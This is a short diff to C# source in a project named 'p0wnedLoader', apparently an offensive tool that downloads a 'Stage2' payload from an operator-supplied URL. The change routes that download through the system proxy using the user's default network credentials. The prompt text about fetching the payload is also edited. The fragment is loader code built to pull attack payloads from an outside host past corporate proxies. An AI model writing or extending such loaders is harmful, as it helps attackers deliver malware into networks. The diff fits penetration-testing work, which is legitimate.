@@ -63,8 +63,15 @@ namespace p0wnedLoader
         {
             try
             {
-                WebRequest request = WebRequest.Create(url);
-                WebResponse response = request.GetResponse();
+                HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);
+                IWebProxy webProxy = myWebRequest.Proxy;
+                if (webProxy != null)
+                {
+                    webProxy.Credentials = CredentialCache.DefaultNetworkCredentials;
+                    myWebRequest.Proxy = webProxy;
+                }
+
+                HttpWebResponse response = (HttpWebResponse)myWebRequest.GetResponse();
                 Stream data = response.GetResponseStream();
                 string html = String.Empty;
                 using (StreamReader sr = new StreamReader(data))
@@ -216,7 +223,7 @@ namespace p0wnedLoader
             string URL = Console.ReadLine();
             Console.ResetColor();
             Console.WriteLine();
-            Console.Write("[*] One moment while getting our Stage2 payload... ".PadRight(56));
+            Console.Write("[*] One moment while getting our Stage2 payload.... ");
             string Stage2 = Get_Stage2(URL);
             Console.ForegroundColor = ConsoleColor.Green;
             Console.WriteLine("-> Done");
